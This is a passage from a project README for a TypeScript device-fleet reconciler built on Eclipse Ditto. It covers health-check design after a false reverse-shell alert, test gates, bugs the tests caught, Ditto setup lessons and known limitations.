destination and a signature cannot be written on a destination. Suppressing the
finding means teaching the detector to look away from `bash` in containers.

An HTTP probe also proves _more_: a 200 means a server parsed a request and
answered it, whereas a listening socket only means something bound a port.
Listening and ready are different states. Where an image has a runtime but no
HTTP client, the probe to reach for is a `/proc/net/tcp` grep in exec form —
reading a file is not opening a socket.

Long version: [**“The Health Check Was a Reverse Shell”**](https://fblln.github.io/articles/the-health-check-was-a-reverse-shell/),
which is where this rule came from — a GuardDuty High-severity reverse-shell
finding on a CI runner that turned out to be a Docker health check asking
WireMock whether it had finished starting.

## Engineering standards

- **Wide comments that explain why.** Every module states the constraint, the
  trade-off, or the failure mode it guards against. A reader should never have to
  reverse-engineer intent from mechanics.
- **Invariants as executable contracts.** I1–I9 (`src/core/contracts.ts`) run on
  **every** decision in production, not only in tests, because a contract that
  only runs in tests is a comment. I9 is new here: the correlation a decision
  reports must agree with whether the device reported a generation — the readout
  is a fact about the fleet, so the strategy choice gets pinned.
- **Deliberate simplifications are marked `ponytail:`** with the ceiling they
  have and the upgrade path, so a shortcut is a read rather than a discovery.
- **Strict TypeScript**: `erasableSyntaxOnly`, `noUncheckedIndexedAccess`,
  `exactOptionalPropertyTypes`, `noPropertyAccessFromIndexSignature`.

## Status

`docker compose up -d --wait` brings up seven services — Postgres, MongoDB,
three Ditto services, the simulated aggregator platform and the reconciler — and
returns only when every one of them reports healthy. `npm run demo` then drives
the fleet and prints the readout. Both have been run; the numbers in this README
are from a run, not from an intention.

**Gates, all green.** `npm run check` runs typecheck, oxlint, Prettier, the
coverage gate, the unit and property suites, the perf budget and the integration
suite.

| gate           | state                                                                                          |
| -------------- | ---------------------------------------------------------------------------------------------- |
| typecheck      | TypeScript 7, `erasableSyntaxOnly` + `noUncheckedIndexedAccess` + `exactOptionalPropertyTypes` |
| lint / format  | oxlint 1.x, zero warnings; Prettier 3.x                                                        |
| `src/core/**`  | **100% lines, branches and functions**, 166 tests in ~0.3s                                     |
| property tests | 400 adversarial worlds + 200 benign, seeded LCG, contracts on every decision                   |
| perf budget    | throughput floor on the decision function                                                      |
| integration    | 12 tests against a Testcontainers Postgres and a live Ditto                                    |
| CI             | `.github/workflows/ci.yml`, fast job and Docker job                                            |

**What the tests found, rather than review.** The repository's claim is that the
checks find things, so here is the ledger from this pass:

- `signature.ts` accepted `t=` with no value as "signed at the epoch", because
  `Number('')` is `0` and `0` is finite. That slipped past the freshness
  window — the cheap check whose whole job is to reject replay floods before any
  HMAC runs — and was caught only by the MAC, then reported as `bad-signature`.
  Not exploitable (forging a digest for `t=0` still needs the secret) but wrong
  in the metric and wrong in the order of checks.
- a signed webhook for a device we do not manage returned **500**. Both channel
  tables reference `device`, so applying the event was a foreign-key violation.
  That is the worst available reply: an at-least-once sender retries a 5xx
  forever, for an event that can never succeed. Now recorded in the inbox with
  `processed_at` null — a misconfiguration somebody should see — and answered
  2xx.
- the restart test passed a mutation it should have failed. Making command ids
  random left it green, because after a `SIGKILL` the restarted process
  re-drives the outbox **row**, which already holds the id, so the idempotency
  key never has to do anything. The restart test proves durability — persisting
  `initialPhase` instead of the real phase,
  fails it immediately — but not idempotency. That now has its own test, which
  the mutation kills.

Each is documented at the site of its fix.

**Three things bringing up Ditto taught**, each recorded in `compose.yaml` next
to the log line it produces, because they are the kind of thing that is obvious
once and never again:

1. every Ditto service must answer to the network alias `ditto-cluster`, or
   Pekko's cluster bootstrap resolves zero contact points and retries forever.
2. the Ditto services must **not** wait on each other with
   `condition: service_healthy`. A Ditto service becomes healthy only once the
   cluster has formed, and forming needs two peers — so that condition makes
   each wait for a peer that is waiting for it.
3. `/health` answers `503 DOWN` on this deliberately trimmed stack while every
   API call works and `/status/health` answers `200 UP`. The probe has to be the
   latter: one that reports a healthy dependency as down sends somebody to debug
   the wrong thing.

**What is still open.**

- **The Hono path currently polls Ditto's reported properties.** It preserves
  capture identity and device timestamps, but can coalesce intermediate events.
  A durable northbound Kafka consumer is the upgrade for fleet-scale ingestion.
- **The assumed-state flag is a proxy.** A clock sample or current generation
  disables it; the stronger "ever successfully correlated" history is not yet
  persisted. See `src/core/presentation.ts`.
- **Mutation testing is manual.** Three mutants were planted and checked by
  hand on the paths that matter (the command-id derivation, the phase persist,
  the platform's replay counter). A `cargo mutants` equivalent for TypeScript —
  StrykerJS — is not wired in.
- **The unknown-correlation rate is weighted by decisions, not by devices**, and
  that is worth knowing before reading it. A device that cannot be correlated
  keeps generating correlation attempts while it waits; one that echoes a
  generation resolves on the first. So the rate answers "how much of my
  decision-making is guesswork", which is the right operational question, and
  **not** "what fraction of my fleet counts", which it over-states.

## Deliberate limits

- **One boolean intent** (`charging`). The interesting part is the correlation
  and its provenance, not the schema.
- **Override precedence is implemented; override _policy_ is one choice of many.**
  A bounded hold with a conflict escalation is defensible and is not the only
  defensible answer. It is a parameter and a pure function precisely so the next
  answer is a config change and a unit test.
- **One process, three loops.** Independent failure modes would be split in a
  real deployment; at this size splitting them would add a broker to prove
  something the loops already demonstrate. They are separate functions precisely
  so splitting them later is a change to `src/app.ts` only.
- **The gate is per process.** A device is reconciled by one process at a time,
  but two processes share a vendor quota and each paces to the full limit. The
  429 path self-corrects within one window; a shared bucket is the upgrade.
- **No migration history.** `create table if not exists`, applied at startup, so
  a clean machine needs no migration step. The moment two schema versions must
  coexist, this needs a real migration tool.
- **The skew and latency bounds are declared assumptions, not constants.**
  Tighter bounds decide more often and are wrong more often. That trade-off
  belongs to whoever knows the fleet, so it is an environment variable — and the
  readout exists so the person changing it can see the effect.
